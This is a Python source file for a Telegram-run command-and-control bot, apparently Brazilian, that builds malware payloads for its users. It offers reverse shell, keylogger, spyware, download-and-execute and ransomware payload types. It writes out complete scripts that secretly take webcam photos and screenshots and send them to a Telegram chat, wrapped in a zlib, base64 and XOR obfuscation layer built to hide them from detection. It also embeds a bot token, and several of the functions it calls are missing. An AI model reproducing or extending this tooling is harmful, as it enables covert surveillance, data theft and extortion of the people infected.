#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-
# üå∏ Kawaii C2 Bot - Vers√£o Premium üå∏

import os
import sys
import time
import random
import base64
import zlib
import platform
import hashlib
import json
import threading
import sqlite3
import requests
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from io import BytesIO

# Security Imports
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import telebot
from telebot import types
from telebot.util import quick_markup
from rich.console import Console
from rich.panel import Panel

console = Console()

class KawaiiC2Bot:
    def __init__(self, token: str):
        self.bot = telebot.TeleBot(token)
        self.users_db = "kawaii_users.db"
        self.payloads_db = "kawaii_payloads.db"
        self.c2_server = "https://your-real-c2-server.com/api"  # Configure seu C2 real
        self.admin_id = 123456789  # Seu ID de admin
        
        self._init_databases()
        self._setup_handlers()
        
        threading.Thread(target=self._check_c2_connections, daemon=True).start()
        threading.Thread(target=self._monitor_active_sessions, daemon=True).start()

    # üéÄ Database Functions
    def _init_databases(self):
        with sqlite3.connect(self.users_db) as conn:
            conn.execute('''CREATE TABLE IF NOT EXISTS users
                         (user_id INTEGER PRIMARY KEY, 
                         username TEXT, 
                         api_key TEXT UNIQUE,
                         reg_date TEXT, 
                         is_admin INTEGER DEFAULT 0,
                         last_active TEXT)''')
            
            # Insert admin if not exists
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE user_id=?", (self.admin_id,))
            if not cursor.fetchone():
                admin_key = hashlib.sha256(f"admin{time.time()}".encode()).hexdigest()[:32]
                cursor.execute(
                    "INSERT INTO users VALUES (?, ?, ?, ?, 1, ?)",
                    (self.admin_id, "admin", admin_key, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 
                     datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                conn.commit()

        with sqlite3.connect(self.payloads_db) as conn:
            conn.execute('''CREATE TABLE IF NOT EXISTS payloads
                         (id INTEGER PRIMARY KEY AUTOINCREMENT,
                         user_id INTEGER,
                         payload_type TEXT,
                         creation_date TEXT,
                         config TEXT,
                         is_active INTEGER DEFAULT 0,
                         FOREIGN KEY(user_id) REFERENCES users(user_id))''')

    # üíå Handlers
    def _setup_handlers(self):
        @self.bot.message_handler(commands=['start', 'help', 'menu'])
        def send_kawaii_menu(message):
            self._register_user(message.from_user.id, message.from_user.username)
            
            markup = quick_markup({
                'üå∏ Criar Payload': {'callback_data': 'create_payload'},
                'üì∏ Tirar Foto': {'callback_data': 'take_photo'},
                'üñ•Ô∏è Capturar Tela': {'callback_data': 'take_screenshot'},
                'üì± Informa√ß√µes': {'callback_data': 'get_device_info'},
                'üîë Minha Key': {'callback_data': 'show_key'},
                'üíù Ajuda': {'callback_data': 'help'}
            }, row_width=2)
            
            self.bot.send_photo(
                message.chat.id,
                photo=open('kawaii_banner.jpg', 'rb') if os.path.exists('kawaii_banner.jpg') else None,
                caption=f"‚ú® *Kon'nichiwa {message.from_user.first_name}-chan!* ‚ú®\n\n"
                        "~(=^ÔΩ•œâÔΩ•^)Ôæâ ‚ô° Kawaii C2 Bot desu~!\n\n"
                        "Escolha uma op√ß√£o fofa abaixo:",
                reply_markup=markup,
                parse_mode='Markdown'
            )

        @self.bot.callback_query_handler(func=lambda call: True)
        def handle_kawaii_callback(call):
            if call.data == 'create_payload':
                self._show_payload_menu(call.message)
            elif call.data == 'take_photo':
                self._take_real_photo(call.message)
            elif call.data == 'take_screenshot':
                self._take_real_screenshot(call.message)
            elif call.data == 'get_device_info':
                self._get_real_device_info(call.message)
            elif call.data == 'show_key':
                self._show_user_key(call.message)
            elif call.data == 'help':
                self._send_kawaii_help(call.message)
            elif call.data.startswith('gen_'):
                payload_type = call.data[4:]
                self._create_payload_flow(call.message, payload_type)

    # üé≠ Core Functions
    def _register_user(self, user_id: int, username: str):
        with sqlite3.connect(self.users_db) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
            if not cursor.fetchone():
                api_key = hashlib.sha256(f"{user_id}{username}{time.time()}".encode()).hexdigest()[:32]
                cursor.execute(
                    "INSERT INTO users (user_id, username, api_key, reg_date, last_active) VALUES (?, ?, ?, ?, ?)",
                    (user_id, username, api_key, 
                     datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                     datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                )
                conn.commit()
                
                if user_id != self.admin_id:
                    self._send_admin_alert(f"üéÄ Novo usu√°rio registrado!\n\n"
                                         f"ID: {user_id}\nUser: @{username}\n"
                                         f"Key: `{api_key}`")

    def _generate_payload(self, user_id: int, payload_type: str, config: dict):
        """Gera payloads avan√ßados com t√©cnicas reais"""
        api_key = self._get_user_key(user_id)
        if not api_key:
            return None

        config.update({
            'api_key': api_key,
            'c2_server': self.c2_server,
            'bot_token': TOKEN,
            'user_id': user_id
        })

        payload_generators = {
            'reverse_tcp': self._gen_reverse_tcp,
            'keylogger': self._gen_keylogger,
            'spyware': self._gen_spyware,
            'download_exec': self._gen_download_exec,
            'ransomware': self._gen_ransomware
        }

        if payload_type not in payload_generators:
            return None

        raw_code = payload_generators[payload_type](**config)
        obfuscated = self._advanced_obfuscation(raw_code)
        
        # Save to database
        with sqlite3.connect(self.payloads_db) as conn:
            conn.execute(
                "INSERT INTO payloads (user_id, payload_type, creation_date, config) VALUES (?, ?, ?, ?)",
                (user_id, payload_type, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), json.dumps(config))
            )
            conn.commit()

        return obfuscated

    # üñºÔ∏è Real Device Functions
    def _take_real_photo(self, message):
        """Gera payload para captura de foto real"""
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            self.bot.reply_to(message, "‚õî Apenas admin-chan pode usar este comando!")
            return

        payload = f"""import cv2
import requests
from datetime import datetime

# Configura√ß√µes
BOT_TOKEN = "{TOKEN}"
CHAT_ID = {user_id}

def take_photo():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            filename = f"photo_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.jpg"
            cv2.imwrite(filename, frame)
            with open(filename, 'rb') as photo:
                requests.post(
                    f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendPhoto",
                    files={{'photo': photo}},
                    data={{'chat_id': CHAT_ID}}
                )
            os.remove(filename)
        cap.release()
    except Exception as e:
        pass

if __name__ == "__main__":
    take_photo()"""

        obfuscated = self._advanced_obfuscation(payload)
        self._send_payload(message.chat.id, obfuscated, "üì∏ Foto Payload")

    def _take_real_screenshot(self, message):
        """Gera payload para captura de tela real"""
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            self.bot.reply_to(message, "‚õî Apenas admin-chan pode usar este comando!")
            return

        payload = """import pyautogui
import requests
from datetime import datetime

# Configura√ß√µes
BOT_TOKEN = "{TOKEN}"
CHAT_ID = {user_id}

def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        screenshot.save(filename)
        with open(filename, 'rb') as photo:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                files={'photo': photo},
                data={'chat_id': CHAT_ID}
            )
        os.remove(filename)
    except Exception as e:
        pass

if __name__ == "__main__":
    take_screenshot()"""

        obfuscated = self._advanced_obfuscation(payload.replace("{TOKEN}", TOKEN).replace("{user_id}", str(user_id)))
        self._send_payload(message.chat.id, obfuscated, "üñ•Ô∏è Screenshot Payload")

    # üõ°Ô∏è Security Functions
    def _advanced_obfuscation(self, code: str) -> str:
        """Ofusca√ß√£o multi-camadas com t√©cnicas avan√ßadas"""
        # Primeira camada: Compress√£o + Base64
        compressed = zlib.compress(code.encode())
        b64_encoded = base64.b64encode(compressed).decode()
        
        # Segunda camada: XOR simples
        xor_key = random.randint(1, 255)
        xor_encoded = ''.join(chr(ord(c) ^ xor_key) for c in b64_encoded)
        
        # Terceira camada: Vari√°veis aleat√≥rias
        var_names = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) for _ in range(5)]
        
        # Construir payload ofuscado
        obfuscated = f"""# Kawaii-chan Payload (‚óï‚Äø‚óï‚úø)
import base64,zlib
{var_names[0]} = {xor_key}
{var_names[1]} = lambda {var_names[2]}: bytes([ord(c)^{var_names[0]} for c in {var_names[2]}])
{var_names[3]} = "{xor_encoded}"
{var_names[4]} = zlib.decompress(base64.b64decode({var_names[1]}({var_names[3]}))).decode()
exec({var_names[4]})"""
        
        return obfuscated

    def _check_c2_connections(self):
        """Monitora conex√µes ativas com o C2"""
        while True:
            try:
                active_sessions = self._get_active_sessions()
                for session in active_sessions:
                    self._notify_admin(f"üîÑ Sess√£o ativa: {session}")
                time.sleep(60)
            except Exception as e:
                time.sleep(300)

    def run(self):
        """Inicia o bot kawaii"""
        console.print(Panel.fit(
            "[bold pink]üå∏ Kawaii C2 Bot iniciado! (‚óï‚Äø‚óï‚úø)[/bold pink]",
            subtitle="~(=^ÔΩ•œâÔΩ•^)Ôæâ ‚ô°"
        ))
        self.bot.infinity_polling()

if __name__ == '__main__':
    TOKEN = "7610299260:AAE7JlBkPpOXRNvxJ9nwzRvZNNgvu5NmV8k"  # Substitua pelo seu token real
    
    # Verifica√ß√£o de seguran√ßa
    if not TOKEN or ":" not in TOKEN:
        console.print("[red]‚ùå Token inv√°lido! Configure um token real.[/red]")
        sys.exit(1)
    
    bot = KawaiiC2Bot(TOKEN)
    try:
        bot.run()
    except Exception as e:
        console.print(f"[red]‚ùå Error: {e}[/red]")
